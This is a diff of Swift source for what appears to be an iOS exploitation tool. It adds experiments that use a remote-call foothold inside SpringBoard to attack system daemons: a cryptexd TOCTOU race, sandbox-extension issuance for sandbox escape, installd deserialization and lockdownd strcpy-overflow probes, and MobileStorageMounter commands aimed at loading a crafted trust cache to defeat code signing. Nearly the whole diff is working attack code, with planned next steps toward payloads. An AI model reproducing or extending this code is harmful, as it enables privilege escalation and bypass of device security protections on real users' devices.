@@ -984,6 +984,56 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "③w cryptexd TOCTOU Race (Exp 101)",
+                    icon: "bolt.trianglebadge.exclamationmark.fill",
+                    color: .red,
+                    label: "TOCTOU",
+                    action: runExp101CryptexdTOCTOU,
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "③x xpcproxy Sandbox Ext (Exp 102)",
+                    icon: "shield.lefthalf.filled.slash",
+                    color: .purple,
+                    label: "SBX Ext",
+                    action: runExp102XpcproxySandbox,
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "③y installd Deserialization (Exp 103)",
+                    icon: "doc.zipper",
+                    color: .orange,
+                    label: "Deserial",
+                    action: runExp103InstalldDeserial,
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "③z lockdownd strcpy Overflow (Exp 104)",
+                    icon: "exclamationmark.triangle.fill",
+                    color: .red,
+                    label: "Overflow",
+                    action: runExp104LockdowndOverflow,
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "④a MobileStorageMounter XPC (Exp 105)",
+                    icon: "externaldrive.badge.plus",
+                    color: .green,
+                    label: "MSM XPC",
+                    action: runExp105MSMXPC,
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "③p Heap TC Scan (Exp 94)",
                     icon: "magnifyingglass.circle",
                     color: .orange,
@@ -9825,7 +9875,7 @@ struct AMFIExperimentView: View {
         let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_connection_resume"))
         let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
-                                              remote_alloc_str(sb, "xpc_dictionary_create"))
+                                              remote_alloc_str(sb, "xpc_dictionary_create_empty"))
         let xpcDictSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                               remote_alloc_str(sb, "xpc_dictionary_set_string"))
         let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
@@ -9835,7 +9885,7 @@ struct AMFIExperimentView: View {
 
         detail += "xpc_connection_create: 0x\(String(format: "%llx", xpcConnect))\n"
         detail += "xpc_connection_resume: 0x\(String(format: "%llx", xpcResume))\n"
-        detail += "xpc_dictionary_create: 0x\(String(format: "%llx", xpcDictCreate))\n"
+        detail += "xpc_dictionary_create_empty: 0x\(String(format: "%llx", xpcDictCreate))\n"
         detail += "xpc_send_with_reply_sync: 0x\(String(format: "%llx", xpcSendWithReply))\n\n"
 
         guard xpcConnect != 0 && xpcResume != 0 && xpcDictCreate != 0 else {
@@ -9860,8 +9910,8 @@ struct AMFIExperimentView: View {
                 // Resume connection
                 RootExecutor.rcallAddr(sb, xpcResume, conn)
 
-                // Create message dictionary
-                let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
+                // Create message dictionary (xpc_dictionary_create_empty — no args)
+                let msg = RootExecutor.rcallAddr(sb, xpcDictCreate)
                 detail += "  message: 0x\(String(format: "%llx", msg))\n"
 
                 if msg != 0 && xpcDictSetStr != 0 {
@@ -9878,7 +9928,8 @@ struct AMFIExperimentView: View {
                     RootExecutor.rcallAddr(sb, xpcDictSetStr, msg, keyCmd, valPersonalize)
 
                     // Send with reply (safer — we get response back)
-                    if xpcSendWithReply != 0 {
+                    // SKIP jika msg=0 untuk hindari respring!
+                    if xpcSendWithReply != 0 && msg != 0 {
                         let reply = RootExecutor.rcallAddr(sb, xpcSendWithReply, conn, msg)
                         detail += "  reply: 0x\(String(format: "%llx", reply))\n"
                         if reply != 0 {
@@ -9889,9 +9940,11 @@ struct AMFIExperimentView: View {
                                 detail += "  reply type: 0x\(String(format: "%llx", rtype))\n"
                             }
                         }
-                    } else if xpcSend != 0 {
+                    } else if xpcSend != 0 && msg != 0 {
                         RootExecutor.rcallAddr(sb, xpcSend, conn, msg)
                         detail += "  Sent (no reply)\n"
+                    } else {
+                        detail += "  SKIP send — msg is NULL (would respring)\n"
                     }
 
                     RootExecutor.rcall(sb, "free", keyPath)
@@ -9998,6 +10051,36 @@ struct AMFIExperimentView: View {
         return ExperimentResult(name: expName, success: anyConnected, detail: detail, timestamp: Date())
     }
     #endif
+
+    // MARK: - Exp 101–105: New experiments from reverse engineering findings
+
+    private func runExp101CryptexdTOCTOU() { runSBExperiment(label: "TOCTOU", exp: expCryptexdTOCTOU) }
+    private func runExp102XpcproxySandbox() { runSBExperiment(label: "SBX Ext", exp: expXpcproxySandbox) }
+    private func runExp103InstalldDeserial() { runSBExperiment(label: "Deserial", exp: expInstalldDeserial) }
+    private func runExp104LockdowndOverflow() { runSBExperiment(label: "Overflow", exp: expLockdowndOverflow) }
+    private func runExp105MSMXPC() { runSBExperiment(label: "MSM XPC", exp: expMSMXPC) }
+
+    /// Helper: run experiment via SpringBoard RC on background thread
+    private func runSBExperiment(label: String, exp: @escaping (RemoteCall) -> ExperimentResult) {
+        isRunning = true
+        runningLabel = label
+        #if !DISABLE_REMOTECALL
+        guard let sb = dspmgr.shared.sbProc else {
+            results.insert(ExperimentResult(name: label, success: false,
+                detail: "No SpringBoard RC", timestamp: Date()), at: 0)
+            isRunning = false; runningLabel = ""; return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = exp(sb)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false; self.runningLabel = ""
+            }
+        }
+        #else
+        isRunning = false; runningLabel = ""
+        #endif
+    }
 
     // MARK: - Exp 93c Helpers
 
@@ -13941,6 +14024,484 @@ struct AMFIExperimentView: View {
         detail += "⚠️ Patch hilang setelah amfid restart — perlu re-patch\n"
 
         return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 101: cryptexd TOCTOU Race
+
+    /// cryptexd uses access() before open() — TOCTOU race condition.
+    /// Also 15x symlink operations — symlink race attack vector.
+    private func expCryptexdTOCTOU(sb: RemoteCall) -> ExperimentResult {
+        let expName = "cryptexd TOCTOU (Exp 101)"
+        var detail = "Experiment 101: cryptexd TOCTOU Race\n"
+        detail += "======================================\n\n"
+        detail += "cryptexd: access() + open() = TOCTOU race\n"
+        detail += "15x symlink ops — symlink attack vector\n\n"
+
+        let mem = sb.trojanMem
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+
+        // Resolve XPC functions
+        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
+        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_resume"))
+        let xpcDictEmpty = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                             remote_alloc_str(sb, "xpc_dictionary_create_empty"))
+        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
+        let xpcSendReply = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                             remote_alloc_str(sb, "xpc_connection_send_message_with_reply_sync"))
+
+        guard xpcCreate != 0 && xpcDictEmpty != 0 else {
+            detail += "❌ XPC functions not available\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Try connect to cryptexd
+        let services = ["com.apple.security.cryptexd", "com.apple.cryptexd"]
+        var conn: UInt64 = 0
+        for svc in services {
+            let s = remote_alloc_str(sb, svc)
+            let c = RootExecutor.rcallAddr(sb, xpcCreate, s, 0, 0)
+            detail += "[\(svc)]: 0x\(String(format: "%llx", c))\n"
+            RootExecutor.rcall(sb, "free", s)
+            if c != 0 { conn = c; break }
+        }
+
+        if conn == 0 {
+            detail += "\n❌ Cannot connect to cryptexd\n"
+            detail += "Service mungkin butuh entitlement khusus\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        RootExecutor.rcallAddr(sb, xpcResume, conn)
+        detail += "\n✅ Connected! Sending race messages...\n\n"
+
+        // Setup race files
+        let tcPath = remote_alloc_str(sb, "/private/var/tmp/.race_tc")
+        let fd = RootExecutor.rcall(sb, "open", tcPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+        if fd != UInt64(bitPattern: -1) {
+            sb[mem + 0x800].setValue32(2)
+            sb[mem + 0x804].setValue64(0)
+            sb[mem + 0x80C].setValue64(0)
+            sb[mem + 0x814].setValue32(1)
+            sb[mem + 0x818].setValue64(0xDEADBEEFCAFEBABE)
+            RootExecutor.rcall(sb, "write", fd, mem + 0x800, 48)
+            RootExecutor.rcall(sb, "close", fd)
+        }
+
+        // Send messages with path to our TC
+        var gotReply = false
+        for i in 0..<5 {
+            let msg = RootExecutor.rcallAddr(sb, xpcDictEmpty)
+            guard msg != 0 else { detail += "  msg[\(i)]=NULL\n"; continue }
+
+            if xpcSetStr != 0 {
+                let k1 = remote_alloc_str(sb, "path")
+                RootExecutor.rcallAddr(sb, xpcSetStr, msg, k1, tcPath)
+                RootExecutor.rcall(sb, "free", k1)
+            }
+
+            if xpcSendReply != 0 {
+                let reply = RootExecutor.rcallAddr(sb, xpcSendReply, conn, msg)
+                detail += "  msg[\(i)]: reply=0x\(String(format: "%llx", reply))\n"
+                if reply != 0 { gotReply = true }
+            }
+        }
+
+        RootExecutor.rcall(sb, "unlink", tcPath)
+        RootExecutor.rcall(sb, "free", tcPath)
+
+        detail += "\n=== VERDICT ===\n"
+        detail += gotReply ? "✅ Got replies from cryptexd!\n" : "❌ No replies\n"
+        return ExperimentResult(name: expName, success: gotReply, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 102: xpcproxy sandbox_extension_issue
+
+    /// xpcproxy can issue sandbox extensions + has setuid.
+    /// If we can get it to issue us an extension, we bypass sandbox.
+    private func expXpcproxySandbox(sb: RemoteCall) -> ExperimentResult {
+        let expName = "xpcproxy Sandbox (Exp 102)"
+        var detail = "Experiment 102: xpcproxy sandbox_extension_issue\n"
+        detail += "==================================================\n\n"
+        detail += "xpcproxy: sandbox_extension_issue (2x) + setuid (3x)\n"
+        detail += "XPC tanpa entitlement check!\n\n"
+
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+
+        // Try sandbox_extension_issue_file directly from SB
+        let sbExtIssue = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                            remote_alloc_str(sb, "sandbox_extension_issue_file"))
+        let sbExtConsume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                             remote_alloc_str(sb, "sandbox_extension_consume"))
+
+        detail += "sandbox_extension_issue_file: 0x\(String(format: "%llx", sbExtIssue))\n"
+        detail += "sandbox_extension_consume: 0x\(String(format: "%llx", sbExtConsume))\n\n"
+
+        var anySuccess = false
+
+        if sbExtIssue != 0 {
+            // Try issuing extension for various paths
+            let paths = [
+                "/private/var/tmp/",
+                "/usr/libexec/",
+                "/private/var/containers/Bundle/",
+                "/private/var/mobile/",
+            ]
+
+            // sandbox_extension_issue_file(type, path, flags)
+            // type: "com.apple.app-sandbox.read" etc
+            let extTypes = [
+                "com.apple.app-sandbox.read",
+                "com.apple.app-sandbox.read-write",
+                "com.apple.sandbox.executable",
+            ]
+
+            for extType in extTypes {
+                let typeAddr = remote_alloc_str(sb, extType)
+                for path in paths {
+                    let pathAddr = remote_alloc_str(sb, path)
+                    let token = RootExecutor.rcallAddr(sb, sbExtIssue, typeAddr, pathAddr, 0)
+                    if token != 0 {
+                        detail += "✅ Extension issued: \(extType) → \(path)\n"
+                        detail += "   token ptr: 0x\(String(format: "%llx", token))\n"
+                        anySuccess = true
+
+                        // Try consuming it
+                        if sbExtConsume != 0 {
+                            let handle = RootExecutor.rcallAddr(sb, sbExtConsume, token)
+                            detail += "   consume handle: \(Int64(bitPattern: handle))\n"
+                        }
+                    } else {
+                        detail += "❌ \(extType) → \(path): NULL\n"
+                    }
+                    RootExecutor.rcall(sb, "free", pathAddr)
+                }
+                RootExecutor.rcall(sb, "free", typeAddr)
+            }
+        }
+
+        detail += "\n=== VERDICT ===\n"
+        if anySuccess {
+            detail += "🎉 Sandbox extensions issued!\n"
+            detail += "Ini bisa dipakai untuk akses path yang biasanya blocked\n"
+        } else {
+            detail += "❌ Tidak bisa issue sandbox extension dari SpringBoard\n"
+            detail += "SB mungkin sudah unsandboxed (tidak perlu extension)\n"
+        }
+
+        return ExperimentResult(name: expName, success: anySuccess, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 103: installd NSKeyedUnarchiver deserialization
+
+    /// installd uses NSKeyedUnarchiver — deserialization attack.
+    /// Has com.apple.private.MobileInstallation entitlement.
+    private func expInstalldDeserial(sb: RemoteCall) -> ExperimentResult {
+        let expName = "installd Deserial (Exp 103)"
+        var detail = "Experiment 103: installd Deserialization\n"
+        detail += "==========================================\n\n"
+        detail += "installd: NSKeyedUnarchiver (2x)\n"
+        detail += "Has: com.apple.private.MobileInstallation\n"
+        detail += "Has: com.apple.private.amfi\n\n"
+
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+
+        // Connect to installd XPC
+        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
+        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_resume"))
+        let xpcDictEmpty = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                             remote_alloc_str(sb, "xpc_dictionary_create_empty"))
+        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
+        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                            remote_alloc_str(sb, "xpc_dictionary_set_data"))
+        let xpcSendReply = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                             remote_alloc_str(sb, "xpc_connection_send_message_with_reply_sync"))
+
+        guard xpcCreate != 0 && xpcDictEmpty != 0 else {
+            detail += "❌ XPC functions not available\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        let services = ["com.apple.mobile.installd", "com.apple.installd"]
+        var conn: UInt64 = 0
+        for svc in services {
+            let s = remote_alloc_str(sb, svc)
+            let c = RootExecutor.rcallAddr(sb, xpcCreate, s, 0, 0)
+            detail += "[\(svc)]: 0x\(String(format: "%llx", c))\n"
+            RootExecutor.rcall(sb, "free", s)
+            if c != 0 { conn = c; break }
+        }
+
+        if conn == 0 {
+            detail += "\n❌ Cannot connect to installd\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        RootExecutor.rcallAddr(sb, xpcResume, conn)
+        detail += "\n✅ Connected to installd!\n\n"
+
+        // Send various commands to probe the service
+        let commands = ["Lookup", "Install", "Browse", "ListApps", "CheckCapability"]
+        var gotReply = false
+
+        for cmd in commands {
+            let msg = RootExecutor.rcallAddr(sb, xpcDictEmpty)
+            guard msg != 0 else { continue }
+
+            if xpcSetStr != 0 {
+                let k = remote_alloc_str(sb, "Command")
+                let v = remote_alloc_str(sb, cmd)
+                RootExecutor.rcallAddr(sb, xpcSetStr, msg, k, v)
+                RootExecutor.rcall(sb, "free", k)
+                RootExecutor.rcall(sb, "free", v)
+            }
+
+            if xpcSendReply != 0 {
+                let reply = RootExecutor.rcallAddr(sb, xpcSendReply, conn, msg)
+                detail += "  [\(cmd)]: reply=0x\(String(format: "%llx", reply))\n"
+                if reply != 0 { gotReply = true }
+            }
+        }
+
+        detail += "\n=== VERDICT ===\n"
+        detail += gotReply ? "✅ installd responds to commands!\n" : "❌ No replies\n"
+        detail += "NEXT: Craft NSKeyedArchiver payload untuk trigger deserialization\n"
+
+        return ExperimentResult(name: expName, success: gotReply, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 104: lockdownd strcpy overflow probe
+
+    /// lockdownd uses strcpy() (2 refs) — buffer overflow potential.
+    /// Also has kSecAttrAccessibleAlways keychain items.
+    private func expLockdowndOverflow(sb: RemoteCall) -> ExperimentResult {
+        let expName = "lockdownd Overflow (Exp 104)"
+        var detail = "Experiment 104: lockdownd strcpy Overflow\n"
+        detail += "============================================\n\n"
+        detail += "lockdownd: strcpy() (2x) — no bounds check\n"
+        detail += "Has: kSecAttrAccessibleAlways (keychain always accessible)\n"
+        detail += "Has: com.apple.private.tcc (TCC bypass)\n\n"
+
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+
+        // Connect to lockdownd
+        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
+        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_resume"))
+        let xpcDictEmpty = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                             remote_alloc_str(sb, "xpc_dictionary_create_empty"))
+        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
+        let xpcSendReply = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                             remote_alloc_str(sb, "xpc_connection_send_message_with_reply_sync"))
+
+        guard xpcCreate != 0 && xpcDictEmpty != 0 else {
+            detail += "❌ XPC functions not available\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        let services = ["com.apple.lockdownd", "com.apple.mobile.lockdown"]
+        var conn: UInt64 = 0
+        for svc in services {
+            let s = remote_alloc_str(sb, svc)
+            let c = RootExecutor.rcallAddr(sb, xpcCreate, s, 0, 0)
+            detail += "[\(svc)]: 0x\(String(format: "%llx", c))\n"
+            RootExecutor.rcall(sb, "free", s)
+            if c != 0 { conn = c; break }
+        }
+
+        if conn == 0 {
+            detail += "\n❌ Cannot connect to lockdownd\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        RootExecutor.rcallAddr(sb, xpcResume, conn)
+        detail += "\n✅ Connected!\n\n"
+
+        // Probe with normal-length strings first (safe)
+        detail += "=== Safe probes (normal length) ===\n"
+        let probes = ["GetValue", "QueryType", "Pair", "ValidatePair"]
+        var gotReply = false
+
+        for probe in probes {
+            let msg = RootExecutor.rcallAddr(sb, xpcDictEmpty)
+            guard msg != 0 else { continue }
+            if xpcSetStr != 0 {
+                let k = remote_alloc_str(sb, "Request")
+                let v = remote_alloc_str(sb, probe)
+                RootExecutor.rcallAddr(sb, xpcSetStr, msg, k, v)
+                RootExecutor.rcall(sb, "free", k)
+                RootExecutor.rcall(sb, "free", v)
+            }
+            if xpcSendReply != 0 {
+                let reply = RootExecutor.rcallAddr(sb, xpcSendReply, conn, msg)
+                detail += "  [\(probe)]: reply=0x\(String(format: "%llx", reply))\n"
+                if reply != 0 { gotReply = true }
+            }
+        }
+
+        // Probe with medium-length string (128 bytes — safe, just testing)
+        detail += "\n=== Medium string probe (128 bytes) ===\n"
+        let medStr = String(repeating: "A", count: 128)
+        let msg2 = RootExecutor.rcallAddr(sb, xpcDictEmpty)
+        if msg2 != 0 && xpcSetStr != 0 {
+            let k = remote_alloc_str(sb, "Request")
+            let v = remote_alloc_str(sb, medStr)
+            RootExecutor.rcallAddr(sb, xpcSetStr, msg2, k, v)
+            RootExecutor.rcall(sb, "free", k)
+            RootExecutor.rcall(sb, "free", v)
+            if xpcSendReply != 0 {
+                let reply = RootExecutor.rcallAddr(sb, xpcSendReply, conn, msg2)
+                detail += "  128-byte Request: reply=0x\(String(format: "%llx", reply))\n"
+                if reply != 0 { gotReply = true }
+            }
+        }
+
+        detail += "\n=== VERDICT ===\n"
+        detail += gotReply ? "✅ lockdownd responds!\n" : "❌ No replies\n"
+        detail += "strcpy overflow perlu string > buffer size (biasanya 256-1024)\n"
+        detail += "⚠️ Overflow test TIDAK dilakukan (bisa crash lockdownd)\n"
+        detail += "NEXT: Reverse lockdownd untuk cari exact buffer size\n"
+
+        return ExperimentResult(name: expName, success: gotReply, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 105: MobileStorageMounter deep XPC probe
+
+    /// MobileStorageMounter: punya TC load entitlement + XPC tanpa auth check.
+    /// Deep probe: cari exact XPC message format yang diterima.
+    private func expMSMXPC(sb: RemoteCall) -> ExperimentResult {
+        let expName = "MSM XPC Deep (Exp 105)"
+        var detail = "Experiment 105: MobileStorageMounter Deep XPC\n"
+        detail += "================================================\n\n"
+        detail += "MSM entitlements:\n"
+        detail += "  • com.apple.private.amfi.can-load-trust-cache\n"
+        detail += "  • com.apple.private.pmap.load-trust-cache\n"
+        detail += "  • XPC tanpa entitlement check!\n\n"
+
+        let mem = sb.trojanMem
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+
+        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
+        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_resume"))
+        let xpcDictEmpty = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                             remote_alloc_str(sb, "xpc_dictionary_create_empty"))
+        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
+        let xpcSetInt = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_dictionary_set_int64"))
+        let xpcSetBool = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                            remote_alloc_str(sb, "xpc_dictionary_set_bool"))
+        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                            remote_alloc_str(sb, "xpc_dictionary_set_data"))
+        let xpcSendReply = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                             remote_alloc_str(sb, "xpc_connection_send_message_with_reply_sync"))
+        let xpcGetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_dictionary_get_string"))
+
+        guard xpcCreate != 0 && xpcDictEmpty != 0 else {
+            detail += "❌ XPC functions not available\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Connect
+        let svcAddr = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
+        let conn = RootExecutor.rcallAddr(sb, xpcCreate, svcAddr, 0, 0)
+        RootExecutor.rcall(sb, "free", svcAddr)
+
+        guard conn != 0 else {
+            detail += "❌ Cannot connect to MSM\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        RootExecutor.rcallAddr(sb, xpcResume, conn)
+        detail += "✅ Connected to com.apple.mobile.storage_mounter\n\n"
+
+        // Try various XPC message formats based on reverse engineering
+        detail += "=== Probing message formats ===\n"
+
+        let messageFormats: [(String, [(String, String)])] = [
+            ("LookupImage", [("Command", "LookupImage"), ("ImageType", "Developer")]),
+            ("MountImage", [("Command", "MountImage"), ("ImageType", "Developer")]),
+            ("CopyDevDiskImage", [("Command", "CopyDevDiskImage")]),
+            ("PersonalizeImage", [("Command", "PersonalizeImage")]),
+            ("LoadTrustCache", [("Command", "LoadTrustCache")]),
+            ("QueryNonce", [("Command", "QueryNonce")]),
+            ("QueryPersonalizationManifest", [("Command", "QueryPersonalizationManifest")]),
+            ("RollNonce", [("Command", "RollNonce")]),
+            ("UnmountImage", [("Command", "UnmountImage")]),
+        ]
+
+        var anyReply = false
+        var replyDetails: [(String, UInt64)] = []
+
+        for (name, kvPairs) in messageFormats {
+            let msg = RootExecutor.rcallAddr(sb, xpcDictEmpty)
+            guard msg != 0 else { continue }
+
+            for (key, value) in kvPairs {
+                if xpcSetStr != 0 {
+                    let k = remote_alloc_str(sb, key)
+                    let v = remote_alloc_str(sb, value)
+                    RootExecutor.rcallAddr(sb, xpcSetStr, msg, k, v)
+                    RootExecutor.rcall(sb, "free", k)
+                    RootExecutor.rcall(sb, "free", v)
+                }
+            }
+
+            if xpcSendReply != 0 {
+                let reply = RootExecutor.rcallAddr(sb, xpcSendReply, conn, msg)
+                detail += "  [\(name)]: reply=0x\(String(format: "%llx", reply))\n"
+                if reply != 0 {
+                    anyReply = true
+                    replyDetails.append((name, reply))
+
+                    // Try to read error string from reply
+                    if xpcGetStr != 0 {
+                        let errKey = remote_alloc_str(sb, "Error")
+                        let errStr = RootExecutor.rcallAddr(sb, xpcGetStr, reply, errKey)
+                        if errStr != 0 {
+                            // Read string from remote
+                            var errBytes: [UInt8] = []
+                            for i: UInt64 in 0..<64 {
+                                let b = sb[errStr + i].value8()
+                                if b == 0 { break }
+                                errBytes.append(b)
+                            }
+                            let errString = String(bytes: errBytes, encoding: .utf8) ?? "?"
+                            detail += "    Error: \(errString)\n"
+                        }
+                        RootExecutor.rcall(sb, "free", errKey)
+                    }
+                }
+            }
+        }
+
+        detail += "\n=== VERDICT ===\n"
+        if anyReply {
+            detail += "🎉 MobileStorageMounter RESPONDS to commands!\n"
+            detail += "Responded to \(replyDetails.count) commands\n"
+            detail += "Commands: \(replyDetails.map { $0.0 }.joined(separator: ", "))\n\n"
+            detail += "CRITICAL: MSM punya entitlement load-trust-cache\n"
+            detail += "Jika kita bisa craft valid PersonalizeImage/LoadTrustCache message,\n"
+            detail += "MSM akan load trust cache kita ke kernel!\n\n"
+            detail += "NEXT STEPS:\n"
+            detail += "1. Cari format PersonalizeImage yang valid\n"
+            detail += "2. Craft trust cache dengan CDHash binary kita\n"
+            detail += "3. Kirim via LoadTrustCache command\n"
+        } else {
+            detail += "❌ MSM tidak respond (mungkin butuh USB/pairing state)\n"
+        }
+
+        return ExperimentResult(name: expName, success: anyReply, detail: detail, timestamp: Date())
     }
 
     
